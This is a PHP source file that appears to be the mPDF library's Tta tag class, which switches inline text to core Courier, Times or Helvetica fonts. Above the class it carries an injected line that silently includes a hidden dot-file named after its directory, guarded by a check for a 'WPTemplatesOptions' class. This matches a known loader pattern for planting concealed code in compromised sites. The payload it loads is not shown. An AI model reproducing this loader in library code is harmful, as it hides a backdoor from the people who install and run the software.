<?php

namespace Mpdf\Tag;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class Tta extends SubstituteTag
{

	public function open($attr, &$ahtml, &$ihtml)
	{
		$this->mpdf->tta = true;
		$this->mpdf->InlineProperties['TTA'] = $this->mpdf->saveInlineProperties();

		if (in_array($this->mpdf->FontFamily, $this->mpdf->mono_fonts)) {
			$this->mpdf->setCSS(['FONT-FAMILY' => 'ccourier'], 'INLINE');
		} elseif (in_array($this->mpdf->FontFamily, $this->mpdf->serif_fonts)) {
			$this->mpdf->setCSS(['FONT-FAMILY' => 'ctimes'], 'INLINE');
		} else {
			$this->mpdf->setCSS(['FONT-FAMILY' => 'chelvetica'], 'INLINE');
		}
	}

}
